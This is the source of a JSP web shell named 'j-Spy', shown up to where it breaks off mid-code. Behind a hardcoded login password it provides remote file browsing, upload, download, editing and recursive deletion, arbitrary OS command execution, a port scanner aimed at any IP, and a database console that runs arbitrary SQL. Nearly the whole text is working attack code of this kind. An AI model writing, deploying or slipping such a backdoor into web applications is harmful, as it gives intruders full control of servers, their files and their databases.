<!DOCTYPE html>
<%@page import="java.util.concurrent.ConcurrentHashMap"%>
<%@page
	import="java.util.*,java.io.*,java.sql.*,java.util.zip.*,java.lang.reflect.*,java.net.*,javax.servlet.*,javax.servlet.jsp.*"%><%@page
	pageEncoding="utf8"%>
<%!final String passwd = "dingo"; // change to your password%>
<%!final Integer pagesize = 20; // database pagesize
	final String[] charsets = {"utf8", "gbk", "gb2312"};
	String defaultCharset; // set pageEncoding
	String action;
	java.util.concurrent.CountDownLatch c;
	ConcurrentHashMap m;

	void m(JspWriter out, String m) throws Exception {
		if (m != null) {
			out.println("<div style=\"margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;\">");
			out.println(m);
			out.print("</div>");
		}
	}

	String replacePath(String name) {
		return name.replace("\\", "/");
	}

	void printCharset(JspWriter out, String charset) throws Exception {
		for (int i = 0; i < charsets.length; i++) {
			if (charset.equals(charsets[i])) {
				out.println("<OPTION selected=\"selected\" value=\""
						+ charsets[i] + "\">" + charsets[i] + "</OPTION>");
			} else {
				out.println("<OPTION value=\"" + charsets[i] + "\">"
						+ charsets[i] + "</OPTION>");
			}
		}
	}

	String htmlEscape(String s) {
		StringBuffer sb = new StringBuffer();
		char c = 0;
		for (int i = 0; i < s.length(); i++) {
			c = s.charAt(i);
			if (c == '<')
				sb.append("&lt;");
			else if (c == '>')
				sb.append("&gt;");
			//else if (c == ' ')
			//	sb.append("&nbsp;");
			else if (c == '"')
				sb.append("&quot;");
			else if (c == '\'')
				sb.append("&#039;");
			else if (c == '&')
				sb.append("&amp;");
			else
				sb.append(c);
		}
		return sb.toString();
	}

	//port scan
	class ScanPort extends Thread {
		int port;
		String ip;
		int n;
		ConcurrentHashMap m;

		public ScanPort(ConcurrentHashMap m, String ip, int port, int n) {
			this.ip = ip;
			this.port = port;
			this.m = m;
			this.n = n;
		}

		public void run() {
			Socket s = null;
			try {

				s = new Socket(ip, port);
				this.m.put(n, 1);
			} catch (Exception e) {
				this.m.put(n, 0);
			} finally {
				try {
					s.close();
				} catch (Exception e) {
				}
				c.countDown();
			}
		}
	}

	void portScan(JspWriter out, String ip, int port) throws Exception {
		Socket s = null;
		try {
			s = new Socket(ip, port);
			out.println(" port " + port + " is Open<br>");
			out.flush(); //slow page
		} catch (Exception e) {
			out.println(" port " + port + " is Closed<br>");
			out.flush();
		} finally {
			try {
				s.close();
			} catch (Exception e) {
			}
		}
	}

	void exec(JspWriter out, String cmd, String charset) throws Exception {
		String[] cmds = cmd.split(" ");
		Process p = new ProcessBuilder(cmds).start();
		InputStream is = p.getInputStream();
		charset = (charset == null) ? defaultCharset : charset;
		InputStreamReader isr = new InputStreamReader(is, charset);
		BufferedReader br = new BufferedReader(isr);
		String line;
		while ((line = br.readLine()) != null) {
			out.println(line);
			out.println("<br>");
		}
	}

	boolean isRootPath(String path) throws Exception {
		File[] roots = File.listRoots();
		for (int i = 0; i < roots.length; i++) {
			if (replacePath(roots[i].getCanonicalPath()).equals(path)) {
				return true;
			}
		}
		return false;
	}

	/* list file and paths */
	void listFile(JspWriter out, String path) throws Exception {
		File file = new File(replacePath(path));
		if (file.isFile()) {
			file = file.getParentFile();
		}
		if (file.isDirectory() && file.exists()) {
			out.println("<table>");
			out.println("<form id=\"filelist\" name=\"filelist\" action=\"\" method=\"post\">");
			out.println("<input name=\"path\" value=\""
					+ htmlEscape(replacePath(path)) + "\" type=\"hidden\"/>");
			if (file.getParentFile() != null) {
				out.println("<tr><a href=\"javascript:l('"
						+ replacePath(file.getParentFile().getCanonicalPath())
						+ "')\">..</a></tr>");
			}
			File[] f = file.listFiles();
			for (int i = 0; i < f.length; i++) {
				if (f[i].isDirectory()) {
					out.println("<td nowrap><input name=\"delfiles\" type=\"checkbox\" value=\""
							+ replacePath(f[i].getCanonicalPath()) + "\"></td>");
					out.println("<tr><td>" + "<a href=\"javascript:l('"
							+ replacePath(f[i].getCanonicalPath()) + "')\">"
							+ htmlEscape(f[i].getName()) + "</a>" + "</td><td>"
							+ " " + "</td><td>"
							+ " <a href=\"javascript:rename('"
							+ replacePath(f[i].getCanonicalPath()) + "','"
							+ f[i].getName() + "')\">Rename</a> "
							+ "</td></tr>");
				} else {
					out.println("<td nowrap><input name=\"delfiles\" type=\"checkbox\" value=\""
							+ replacePath(f[i].getCanonicalPath()) + "\"></td>");
					out.println("<tr><td>" + htmlEscape(f[i].getName())
							+ "</td><td>" + getSize(f[i].length())
							+ "</td><td>" + " <a href=\"javascript:down('"
							+ replacePath(f[i].getCanonicalPath())
							+ "')\">Down</a> " + " | " + "</td><td>"
							+ " <a href=\"javascript:copy('"
							+ replacePath(f[i].getCanonicalPath())
							+ "')\">Copy</a> " + " |" + "</td><td>"
							+ " <a href=\"javascript:edit('"
							+ replacePath(f[i].getCanonicalPath()) + "','"
							+ defaultCharset + "')\">Edit</a> " + " |"
							+ "</td><td>" + " <a href=\"javascript:rename('"
							+ replacePath(f[i].getCanonicalPath()) + "','"
							+ f[i].getName() + "')\">Rename</a> "
							+ "</td></tr>");
				}
			}
			out.println("<td><input name=\"delall\" value=\"\" type=\"checkbox\" onclick=\"CheckAll(this.form)\" /></td><td><a href=\"javascript:del();\">Delete selected</a></td>");
			out.println("</form>");
			out.println("</table>");
		}
	}
	String getSize(long size) {
		if (size >= 1024 * 1024 * 1024) {
			return new Long(size / 1073741824L) + "G";
		} else if (size >= 1024 * 1024) {
			return new Long(size / 1048576L) + "M";
		} else if (size >= 1024) {
			return new Long(size / 1024) + "K";
		} else
			return size + "B";
	}

	boolean createFile(String path, String content, String charset)
			throws Exception {
		BufferedWriter bw = null;
		OutputStreamWriter os = null;
		FileOutputStream fos = null;
		try {
			if (path != null && !path.equals("")) {
				File file = new File(replacePath(path));
				if (replacePath(path).endsWith("/")) {
					return false;
				}
				if (file.exists() || !file.isFile()) {
					// delete older
					file.delete();
					file.getParentFile().mkdirs();
					// create new
					file.createNewFile();
					fos = new FileOutputStream(file);
					os = new OutputStreamWriter(fos, charset);
					bw = new BufferedWriter(os);
					bw.write(content);
					bw.flush();
					return true;
				}
			}
		} finally {
			if (bw != null) {
				bw.close();
			}
			if (os != null) {
				os.close();
			}
			if (fos != null) {
				fos.close();
			}
		}
		return false;
	}

	void showFile(JspWriter out, String path, String charset) throws Exception {
		BufferedReader br = null;
		InputStreamReader is = null;
		FileInputStream fis = null;
		try {
			if (path == null) {
				path = "";
			}
			path = replacePath(path);
			out.println("<form method=\"POST\" action=\"\" onSubmit=\"create(this);return false;\">");
			out.println("Path: <input name=\"path\" id=\"path\" type=\"text\" value=\""
					+ htmlEscape(path) + "\">");
			out.println("<SELECT id=\"charset\" name=\"charset\" onChange=\"edit('"
					+ htmlEscape(path)
					+ "',this.options[this.options.selectedIndex].value)\">");
			printCharset(out, charset);
			out.println("</SELECT>");
			out.println("<textarea id=\"content\" name=\"content\" cols=\"100\" rows=\"25\">");
			if (!path.equals("")) {
				File file = new File(path);
				if (file.exists() && file.isFile() && file.canWrite()) {

					fis = new FileInputStream(path);
					is = new InputStreamReader(fis, charset);
					br = new BufferedReader(is);
					String s = "";
					while ((s = br.readLine()) != null) {
						out.println(htmlEscape(s));
					}
				}
			}
			out.println("</textarea>");
			out.println("<input type=\"submit\" value=\"submit\"><input type=\"button\" onClick=\"l(this.form.oldpath.value)\" value=\"back\">");
			out.println("</form>");
		} finally {
			if (fis != null) {
				fis.close();
			}
			if (is != null) {
				is.close();
			}
			if (br != null) {
				br.close();
			}
		}
	}

	void downFile(HttpServletResponse response, String path) throws Exception {
		File file = new File(replacePath(path));
		InputStream is = null;
		if (file.exists() && file.canRead()) {
			String fileName = file.getName();
			is = new FileInputStream(path);
			response.reset();
			response.setContentType("APPLICATION/OCTET-STREAM");
			response.addHeader("Content-disposition", "attachment; filename="
					+ new String(fileName.getBytes(), "ISO-8859-1"));
			byte[] b = new byte[100];
			int len;
			try {
				while ((len = is.read(b)) > 0)
					response.getOutputStream().write(b, 0, len);
			} finally {
				if (is != null) {
					is.close();
				}
			}
		}
	}

	boolean copyFile(String path, String topath) throws Exception {
		InputStream is = null;
		OutputStream os = null;
		if (replacePath(topath).endsWith("/")) {
			return false;
		}
		try {
			File file = new File(replacePath(path));
			File tofile = new File(replacePath(topath));
			if (file.exists() && file.canRead() && !tofile.exists()
					&& tofile.getParentFile().exists()) {
				is = new FileInputStream(file);
				os = new FileOutputStream(tofile);
				byte[] buf = new byte[1024];
				int bytesRead;
				while ((bytesRead = is.read(buf)) > 0) {
					os.write(buf, 0, bytesRead);
				}
				return true;
			}
		} finally {
			if (is != null) {
				is.close();
			}
			if (os != null) {
				os.close();
			}
		}
		return false;
	}

	boolean renameFile(String path, String name) throws Exception {
		File file = new File(replacePath(path));
		name = replacePath(name);
		if (name.contains("/")) {
			return false;
		}
		if (file.exists()) {
			String dingo = file.getParentFile().getCanonicalPath()
					+ File.separator + name;
			return file.renameTo(new File(dingo));
		}
		return false;
	}

	boolean deleteFile(String path) throws Exception {
		File file = new File(replacePath(path));
		if (file.isDirectory()) {
			String[] children = file.list();
			if (children == null) { //empty by default
				file.delete();
			} else {
				for (int i = 0; i < children.length; i++) {
					boolean success = deleteFile(path + File.separator
							+ children[i]);
					if (!success) {
						return false;
					}
				}
			}
		}
		return file.delete();
	}

	boolean uploadFile(HttpServletRequest request, String path, String charset)
			throws Exception {

		ServletInputStream sis = request.getInputStream();
		byte dataBytes[] = new byte[1024];
		byte tmpdataBytes[] = null;
		int byteRead = 0;
		int totalBytesRead = 0;
		int i = 0;
		String tmpString = null;
		String filename = null;
		FileOutputStream fos = null;

		while ((byteRead = sis.readLine(dataBytes, 0, dataBytes.length)) != -1) {
			tmpString = new String(dataBytes, 0, byteRead, charset);
			if ((i = tmpString.indexOf("filename=\"")) != -1) {
				tmpString = tmpString.substring(i + 10);
				tmpString = tmpString.substring(0, tmpString.indexOf("\""));
				File tmpFile = new File(tmpString);
				filename = tmpFile.getName();
			}
			if ((i = tmpString.indexOf("Content-Type:")) != -1) {
				break;
			}
		}

		sis.readLine(dataBytes, 0, dataBytes.length); //another blank line
		if (filename != null) {
			File file = new File(path + File.separator + filename);
			if (!file.exists()) {
				try {
					fos = new FileOutputStream(file);
					while ((byteRead = sis.readLine(dataBytes, 0,
							dataBytes.length)) != -1) {

						if ((dataBytes[0] == 45) && (dataBytes[1] == 45)
								&& (dataBytes[2] == 45) && (dataBytes[3] == 45)
								&& (dataBytes[4] == 45)) {
							fos.write(tmpdataBytes, 0, tmpdataBytes.length-2); // -2 for /n
							break;
						}

						if (tmpdataBytes != null) {
							fos.write(tmpdataBytes, 0, tmpdataBytes.length);
						}

						tmpdataBytes = Arrays.copyOf(dataBytes, byteRead);
						//fos.write(dataBytes, 0, byteRead);
					}
					fos.flush();
					return true;
				} finally {
					if (fos != null) {
						fos.close();
					}
				}
			}
		}

		//	
		//	fos.write(dataBytes, startPos, (endPos - startPos));
		//	fos.flush();
		//	fos.close();
		return false;
	}
	String makeDir(String path, String name) throws Exception {
		File file = new File(replacePath(path));
		name = replacePath(name);
		String dingo = file.getCanonicalPath() + File.separator + name;
		file = new File(dingo);
		if (file.mkdirs()) {
			return file.getCanonicalPath();
		}
		return null;
	}

	public static void stopDB(HttpSession s) throws Exception {
		s.removeAttribute("db");
		s.removeAttribute("dbtype");
		s.removeAttribute("dbhost");
		s.removeAttribute("dbusername");
		s.removeAttribute("dbpassword");
		s.removeAttribute("dbport");
	}

	public class DB {
		private String type;
		private String host;
		private String username;
		private String password;
		private String port;
		public HttpSession s;
		public JspWriter out;

		private DB(HttpSession s, JspWriter out, String type, String host,
				String username, String password, String port) {
			this.s = s;
			this.out = out;
			this.type = type;
			this.host = host;
			this.username = username;
			this.password = password;
			this.port = port;
		}

		//check and login
		public void start() throws Exception {
			Connection con = null;
			String url = switchDBUrl(this.type, this.host, this.port, null);
			try {
				con = DriverManager.getConnection(url, this.username,
						this.password);
				s.setAttribute("dbtype", type);
				s.setAttribute("dbhost", host);
				s.setAttribute("dbusername", username);
				s.setAttribute("dbpassword", password);
				s.setAttribute("dbport", port);
			} catch (Exception e) {
				throw new Exception(e);
			} finally {
				if (con != null) {
					con.close();
				}
			}

		}

		public ArrayList getDatabases() throws Exception {
			Connection con = null;
			ResultSet res = null;
			String url = switchDBUrl(this.type, this.host, this.port, null);

			try {
				con = DriverManager.getConnection(url, this.username,
						this.password);
				DatabaseMetaData meta = con.getMetaData();
				res = meta.getCatalogs();
				ArrayList dbs = new ArrayList();
				while (res.next()) {
					String db = res.getString("TABLE_CAT");
					dbs.add(db);
				}
				return dbs;
			} catch (Exception e) {
				throw new Exception(e);
			} finally {
				if (res != null) {
					res.close();
				}
				if (con != null) {
					con.close();
				}
			}
		}

		public ArrayList getTable(String db) throws Exception {
			Connection con = null;
			ResultSet res = null;
			try {
				String url = switchDBUrl(this.type, this.host, this.port, db);
				con = DriverManager.getConnection(url, this.username,
						this.password);
				DatabaseMetaData meta = con.getMetaData();
				res = meta.getTables(null, null, null, null);
				ArrayList tables = new ArrayList();
				while (res.next()) {
					String table = res.getString("TABLE_NAME");
					tables.add(table);
				}
				return tables;
			} catch (Exception e) {
				throw new Exception(e);
			} finally {
				if (res != null) {
					res.close();
				}
				if (con != null) {
					con.close();
				}
			}
		}

		public void getColumn(String db, String tb, String pagenum)
				throws Exception {
			Integer ipage = Integer.valueOf(pagenum);
			String sql = "SELECT * FROM " + tb + " limit " + ipage * pagesize
					+ "," + pagesize;
			this.exec(db, sql);

			//out put pagenav
			sql = "SELECT count(*) as totalnum FROM " + tb;
			Integer totalnum = this.getCount(db, sql);
			if (totalnum > pagesize) {
				out.println("total " + totalnum / pagesize + " pages");
				out.println("<form method=\"POST\" action=\"\" onSubmit=\"showcolumn('"
						+ db
						+ "','"
						+ tb
						+ "',"
						+ "this.pagenum.value);return false;\"><input name=\"pagenum\" type=\"text\" size=\"5\" value=\"\"><input type=\"submit\" value=\"go\"></form>");
			}
		}

		public void exec(String db, String sql) throws Exception {
			Connection con = null;
			PreparedStatement ps = null;
			ResultSet res = null;
			ResultSetMetaData rsmd = null;
			try {
				String url = switchDBUrl(this.type, this.host, this.port, db);
				con = DriverManager.getConnection(url, this.username,
						this.password);
				DatabaseMetaData meta = con.getMetaData();
				ps = con.prepareStatement(sql);
				ps.execute(sql);
				out.println("run success!");
				res = ps.getResultSet();
				if (res != null) {
					rsmd = res.getMetaData();
					String[] columnname = null;
					if (rsmd != null) {
						int count = rsmd.getColumnCount();
						columnname = new String[count];
						out.println("<br>");
						for (int i = 1; i <= count; i++) {
							columnname[i - 1] = rsmd.getColumnName(i);
							out.println(htmlEscape(rsmd.getColumnName(i)));
						}
					}
					while (res.next()) {
						if (columnname != null) {
							out.println("<br>");
							for (int i = 0; i < columnname.length; i++) {
								out.println(htmlEscape(res.getObject(
										columnname[i]).toString()));
							}
							out.println("<br>");
						}
					}
				}
			} catch (Exception e) {
				throw new Exception(e);
			} finally {
				if (res != null) {
					res.close();
				}
				if (con != null) {
					con.close();
				}
			}
		}

		public Integer getCount(String db, String sql) throws Exception {
			Connection con = null;
			PreparedStatement ps = null;
			ResultSet res = null;
			ResultSetMetaData rsmd = null;
			try {
				String url = switchDBUrl(this.type, this.host, this.port, db);
				con = DriverManager.getConnection(url, this.username,
						this.password);
				DatabaseMetaData meta = con.getMetaData();
				ps = con.prepareStatement(sql);
				ps.execute(sql);
				res = ps.getResultSet();
				while (res.next()) {
					return res.getInt("totalnum");
				}
				return 0;
			} catch (Exception e) {
				throw new Exception(e);
			} finally {
				if (res != null) {
					res.close();
				}
				if (con != null) {
					con.close();
				}
			}
		}

		public String switchDBUrl(String type, String host, String port,
				String db) throws Exception {
			String url = "";
			if (db == null) {
				db = "";
			}
			if (type.equals("mysql")) {
				Class.forName("com.mysql.jdbc.Driver");
				url = "jdbc:mysql://" + host + ":" + port + "/" + db;
			} else if (type.equals("oracle")) {
				Class.forName("oracle.jdbc.driver.OracleDriver");
				url = "jdbc:oracle:thin:" + host + ":" + port + "/" + db;
			} else if (type.equals("sqlserver")) {
				Class.forName("com.microsoft.jdbc.sqlserver.SQLServerDriver");
				url = "jdbc:microsoft:sqlserver://" + host + ":" + port + "/"
						+ db;
			}
			return url;
		}
	}%>
<%
	session.setMaxInactiveInterval(20 * 60); //20 minutes by default
	response.addHeader("X-XSS-Protection", "0"); //for new chrome
	defaultCharset = response.getCharacterEncoding(); //defalut charset ,same as pageEncoding

	action = (request.getParameter("action") == null)
			? "FileManager"
			: request.getParameter("action");
	if (action.equals("login")
			&& request.getParameter("password").equals(passwd)) {
		session.setAttribute("login", "j-Spy by dingo");
		session.setAttribute("path", application.getRealPath("/"));
		response.sendRedirect(request.getRequestURI());
	}

	if (session.getAttribute("login") == null) {
		out.println("<style type=\"text/css\">input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}</style><form method=\"POST\" action=\"\"><span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\" value=\"\"><input type=\"hidden\" name=\"action\" value=\"login\"><input type=\"submit\" value=\"Login\"></form>");
		return; //no permission ,die
	}
%>
<html>
<head>
<title>jSpy-<%=action%></title>
<script>
	function $(id) {
		return document.getElementById(id);
	}
	
	function doPost(pam) {
		var　tempForm　=　document.createElement("form");　
		tempForm.action="";　
		tempForm.method="post";　
		document.body.appendChild(tempForm);
		for (var i in pam) { 　　
			var　tempInput　=　document.createElement("input");　
			tempInput.type="hidden";　
			tempInput.name= i;　　
			tempInput.value= pam[i];
			tempForm.appendChild(tempInput);
		}　
		tempForm.submit();　
	}
	
	
	function g(action) {
		doPost({"action":action});
	}
	
	function edit(path,charset) {
		doPost({"action":"FileManager","fileAction":"edit","pathing":path,"charset":charset});
	}
	
	function create(form) {
		var path = form.path.value
		var content = form.content.value
		var charset = form.charset.value
		doPost({"action":"FileManager","fileAction":"create","pathing":path,"content":content,"charset":charset});
	}
	
	function l(path) {
		doPost({"action":"FileManager","fileAction":"list","pathing":path});　
	}
	
	function down(path) {
		doPost({"action":"FileManager","fileAction":"download","pathing":path});　
	}
	
	function copy(path) {
		var topath = prompt("Copy To?",path);
		if(topath != null){
			doPost({"action":"FileManager","fileAction":"copy","pathing":path,"topath":topath});	
		}　
	}
	
	function rename(path,name) {
		var name = prompt("Rename To?",name);
		if(name != null){
			doPost({"action":"FileManager","fileAction":"rename","pathing":path,"name":name});	
		}　
	}
	
	function makedir(path){
		var name = prompt("Dir Name?(support a/b/c)");
		if(name != null){
			doPost({"action":"FileManager","fileAction":"makedir","name":name});	
		}　
	}
	
	function createfile(name) {
		var name = prompt("File Name?");
		if(name != null){
			doPost({"action":"FileManager","fileAction":"createfile","name":name});		
		}　
	}
	
	function del() {
		form = document.forms['filelist'];
		var chestr = "";
		for(var i=0;i<form.elements.length;i++) {
				var e = form.elements[i];			
				if(e.checked == true){
				  chestr+=e.value+",";
				}
		}
	    doPost({"action":"FileManager","fileAction":"delete","paths":chestr});
	}
	
	function scan(form) {
		var ip = form.ip.value;
		var port = form.port.value;
		doPost({"action":"PortScan","portAction":"scan","ip":ip,"port":port});
		return false;
	}
	
	function exec(form) {
		var command = form.command.value;
		var charset = form.charset.value;
		doPost({"action":"ExecuteCommand","commandAction":"exec","command":command,"charset":charset});
		return false;
	}
	
	function dblogin(form) {
		var dbtype = form.dbtype.value;
		var dbhost = form.dbhost.value;
		var dbport = form.dbport.value;
		var dbusername = form.dbusername.value;
		var dbpassword = form.dbpassword.value;
		doPost({"action":"DatabaseManager","dbAction":"login","dbtype":dbtype,"dbhost":dbhost,"dbport":dbport,"dbusername":dbusername,"dbpassword":dbpassword});
		return false;
	}
	
	function dblogout() {
		doPost({"action":"DatabaseManager","dbAction":"logout"});
	}
	
	function showtable(database){
		doPost({"action":"DatabaseManager","dbAction":"showtable","database":database});
	}
	
	function showcolumn(database,table,pagenum){
		if(pagenum == null){
			pagenum = 0;
		}
		doPost({"action":"DatabaseManager","dbAction":"showcolumn","database":database,"table":table,"pagenum":pagenum});
	}
	
	function runsql(database,sql){
		doPost({"action":"DatabaseManager","dbAction":"runsql","database":database,"sql":sql});
	}
	
	function CheckAll(form) {
		for(var i=0;i<form.elements.length;i++) {
			var e = form.elements[i];
			if (e.name == 'delfiles')
			e.checked = form.delall.checked;
	    }
	}	 
	 
</script>
</head>
<body>
	<table width="100%" border="0" cellpadding="0" cellspacing="0">
		<tr>
			<td><%=request.getHeader("host")%>(<%=InetAddress.getLocalHost()%>)|<a
				href="javascript:g('Logout');">Logout </a><span
				style="float: right;"><%=System.getProperties().getProperty("os.name")%>/verion:<%=System.getProperties().getProperty("os.version")%>/<%=System.getenv("USERNAME")%>
			</span></td>
		</tr>
		<tr>
			<td><a href="javascript:g('FileManager');">File Manager</a> | <a
				href="javascript:g('DatabaseManager');">Database Manager</a> | <a
				href="javascript:g('PortScan');">Port Scan</a> | <a
				href="javascript:g('ExecuteCommand');">Execute Command</a>
		</tr>
	</table>
	<%
		try {
			if (action.equals("FileManager")) {
				out.println("File Manager &raquo;<br>");
				String fileAction = (request.getParameter("fileAction") == null) ? "list"
						: request.getParameter("fileAction");
				//for upload
				if (request.getContentType() != null
						&& request.getContentType().indexOf(
								"multipart/form-data") >= 0) {
					fileAction = "upload";
				}

				//path : /a/ pathing: /a/xx.txt
				String path = (String) session.getAttribute("path");
				String pathing = (request.getParameter("pathing") == null) ? null
						: request.getParameter("pathing").trim();
				String charset = (request.getParameter("charset") == null) ? defaultCharset
						: request.getParameter("charset").trim();
				if (fileAction.equals("list")) {
					if (pathing != null) {
						File file = new File(pathing);
						if (file.isFile()) {
							session.setAttribute("path", file
									.getParentFile().getCanonicalPath());
						} else {
							session.setAttribute("path", pathing);
						}

					}
				} else if (fileAction.equals("download")) {
					out.clear();
					out = pageContext.pushBody();
					downFile(response, pathing);
				} else if (fileAction.equals("copy")) {
					String topath = request.getParameter("topath");
					if (topath != null && copyFile(pathing, topath)) {
						session.setAttribute("path", new File(topath)
								.getParentFile().getPath());
						m(out, "Copy Success");
					} else {
						m(out, "Copy Error");
					}
				} else if (fileAction.equals("edit")) {
					showFile(out, pathing, charset);
				} else if (fileAction.equals("rename")) {
					String name = request.getParameter("name").trim();
					if (name != null && !name.equals("")
							&& renameFile(pathing, name)) {
						m(out, "Rename Success");
					} else {
						m(out, "Rename Error");
					}
				} else if (fileAction.equals("create")) {
					String content = (request.getParameter("content") == null) ? ""
							: request.getParameter("content");
					if (createFile(pathing, content, charset)) {
						path = new File(pathing).getParentFile()
								.getCanonicalPath();
						session.setAttribute("path", path);
						m(out, "Save Success!");
					} else {
						m(out, "Save Error");
					}
				} else if (fileAction.equals("delete")) {
					String paths = request.getParameter("paths");
					if (paths != null) {
						String[] dingo = paths.split(",");
						boolean flag = false;
						for (int i = 0; i < dingo.length; i++) {
							if (dingo[i].length() != 0) {
								flag = deleteFile(dingo[i]);
							}
						}
						if (flag) {
							m(out, "delete success");
						} else {
							m(out, "delete error");
						}
					}
				} else if (fileAction.equals("makedir")) {
					String name = request.getParameter("name").trim();
					if (name != null && !name.equals("")
							&& (path = makeDir(path, name)) != null) {
						session.setAttribute("path", path);
						m(out, "Makedir Success");
					} else {
						m(out, "Makedir Error");
					}
				} else if (fileAction.equals("createfile")) {
					String name = request.getParameter("name").trim();
					if (name != null && !name.equals("")
							&& !replacePath(name).endsWith("/")) {
						pathing = path + File.separator + name;
						showFile(out, pathing, charset);
					}
				} else if (fileAction.equals("upload")) {
					uploadFile(request, path, defaultCharset);
				}

				if (!fileAction.equals("edit")
						&& !fileAction.equals("createfile")) {
					//The navigation bar.
					String naviScript = "<script>document.onclick = shownav;function shownav(e){var src = e?e.target:event.srcElement;do{if(src.id ==\"jumpto\") {$(\'inputnav\').style.display =\"\";$(\'pathnav\').style.display = \"none\";return;}if(src.id ==\"inputnav\") {return;}src = src.parentNode;}while(src.parentNode)$(\'inputnav\').style.display = \"none\";$(\'pathnav\').style.display = \"\";}</script>";
					out.println(naviScript);

					path = (String) session.getAttribute("path");
					File file = new File(path);

					if (file.isFile()) {
						file = file.getParentFile();
					}
					out.println("<table id=\"pathnav\" width=\"100%\" border=\"0\" cellpadding=\"5\" cellspacing=\"0\" style=\"\"><tbody><tr><td width=\"100%\">");
					ArrayList fList = new ArrayList();
					int num = 0;
					while (file != null) {
						fList.add(file);
						num++;
						file = file.getParentFile();
					}

					for (int i = 0; i < fList.size(); i++) {
						File tmpFile = (File) fList.get(fList.size() - i
								- 1);
						if (tmpFile.getName().equals("")) {
							out.println("<a href=\"javascript:l('"
									+ replacePath(tmpFile
											.getCanonicalPath()) + "')\">"
									+ replacePath(tmpFile.getPath())
									+ "</a>");
						} else {
							out.println("<a href=\"javascript:l('"
									+ replacePath(tmpFile
											.getCanonicalPath()) + "')\">"
									+ htmlEscape((tmpFile.getName()))
									+ "/</a>");
						}
					}
					out.println("<td nowrap=\"\"><input class=\"bt\" id=\"jumpto\" name=\"jumpto\" value=\"Jump to\" type=\"button\"></td></tr></tbody></table>");
					File dingo = new File(path);
					out.println("<table id=\"inputnav\" width=\"100%\" border=\"0\" cellpadding=\"5\" cellspacing=\"0\" style=\"display: none;\"><tr><td><form action=\"\" method=\"post\" id=\"godir\" name=\"godir\" onSubmit=\"l(this.dir.value);return false;\"><input class=\"input\" name=\"dir\" value=\""
							+ replacePath(dingo.getCanonicalPath())
							+ "\" type=\"text\" style=\"width:99%;margin:0 8px;\"></td><td nowrap=\"\"><input class=\"bt\" value=\"GO\" type=\"submit\">");
					out.println("</form></td></tr></table>");
					out.println("<table><tr><td><a href=\"javascript:makedir()\"> MakeDir </></td><td><a href=\"javascript:createfile()\"> CreateFile </a></td><td><a href=\"javascript:l('"
							+ replacePath(application.getRealPath("/"))
							+ "')\"> WebRoot </a></td><td><a href=\"javascript:l('"
							+ replacePath(application.getRealPath(request
									.getRequestURI()))
							+ "')\"> J-spy Root </></td><td><form action=\"\" method=\"POST\" enctype=\"multipart/form-data\"><input name=\"uploadfile\" value=\"\" type=\"file\"><input value=\"Upload\" type=\"submit\"></form></td></tr></table>");

					//navigatin bar finish
					listFile(out, path);
				}
			} else if (action.equals("DatabaseManager")) {
				//hard work
				out.println("Database Manager &raquo;<br>");
				DB db = null;
				String dbAction = (request.getParameter("dbAction") == null) ? "wait"
						: request.getParameter("dbAction");

				if (dbAction.equals("login")) {
					if (request.getParameter("dbtype") != null
							&& request.getParameter("dbhost") != null
							&& request.getParameter("dbport") != null
							&& request.getParameter("dbusername") != null
							&& request.getParameter("dbpassword") != null) {

						String type = request.getParameter("dbtype");
						String host = request.getParameter("dbhost");
						String username = request
								.getParameter("dbusername").trim();
						String password = request
								.getParameter("dbpassword").trim();
						String port = request.getParameter("dbport");
						try {
							db = new DB(session, out, type, host, username,
									password, port);
							db.start();
							session.setAttribute("db", db);
						} catch (Exception e) {
							db = null;
							session.removeAttribute("db");
							m(out, "Cannot Connect DB");
						}
					}
				} else if (dbAction.equals("logout")) {
					stopDB(session);
				}

				// connect bar
				if (session.getAttribute("db") == null) {
					out.println("<form name=\"db\" id=\"db\" action=\"\" method=\"post\" onSubmit=\"dblogin(this);return false;\">");
					out.println("type:<SELECT id=\"dbtype\" name=\"dbtype\"><OPTION value=\"mysql\">Mysql</OPTION> <OPTION value=\"sqlserver\">SQL Server</OPTION> <OPTION value=\"oracle\">Oracle</OPTION></SELECT>");
					out.println("host:<input id=\"dbhost\" name=\"dbhost\" type=\"text\" value=\"127.0.0.1\"> port:<input id=\"dbport\" name=\"dbport\" type=\"text\" value=\"3306\"> username:<input id=\"dbusername\" name=\"dbusername\" type=\"text\" value=\"\"> password:<input id=\"dbpassword\" name=\"dbpassword\" type=\"password\" value=\"\">");
					out.println("<input type=\"submit\" value=\"connect\">");
				} else {
					db = (DB) session.getAttribute("db");
					out.println("<form name=\"db\" id=\"db\" action=\"\" method=\"post\" onSubmit=\"dblogout();return false;\">");
					out.println("type:<SELECT id=\"dbtype\" name=\"dbtype\"><OPTION value=\"mysql\">Mysql</OPTION> <OPTION value=\"sqlserver\">SQL Server</OPTION> <OPTION value=\"oracle\">Oracle</OPTION></SELECT>");
					out.println("host:<input id=\"dbhost\" name=\"dbhost\" type=\"text\"  disabled=\"disabled\" value=\""
							+ session.getAttribute("dbhost")
							+ "\"> username:<input id=\"dbport\" name=\"dbport\" type=\"text\" disabled=\"disabled\" value=\""
							+ session.getAttribute("dbport")
							+ "\"> username:<input id=\"dbusername\" name=\"dbusername\" type=\"text\" disabled=\"disabled\" value=\""
							+ session.getAttribute("dbusername")
							+ "\"> password:<input id=\"password\" name=\"password\" type=\"password\" disabled=\"disabled\" value=\""
							+ session.getAttribute("dbusername") + "\">");
					out.println("<input type=\"submit\" value=\"disconnect\"></form>");

					// db select
					String database = request.getParameter("database");
					String table = request.getParameter("table");
					out.println("<select onchange=\"showtable(this.options[this.options.selectedIndex].value)\" >");
					out.println("<option selected=\"selected\" disabled=\"disabled\">==Select Database==</option>");
					for (int i = 0; i < db.getDatabases().size(); i++) {
						String s_database = (String) db.getDatabases().get(
								i);
						if (database != null && database.equals(s_database)) {
							out.println("<option value=\"" + s_database
									+ "\" selected=\"selected\">"
									+ s_database + "</option>");
						} else {
							out.println("<option value=\"" + s_database
									+ "\">" + s_database + "</option>");
						}
					}
					out.println("</select>");

					if (dbAction.equals("showtable")
							|| dbAction.equals("showcolumn")
							|| dbAction.equals("runsql")) {
						if (database == null) {
							throw new Exception(
									"selected database/table error");
						}

						out.println("<select onchange=\"showcolumn('"
								+ database
								+ "',this.options[this.options.selectedIndex].value)\" >");
						out.println("<option selected=\"selected\" disabled=\"disabled\">==Select Table==</option>");
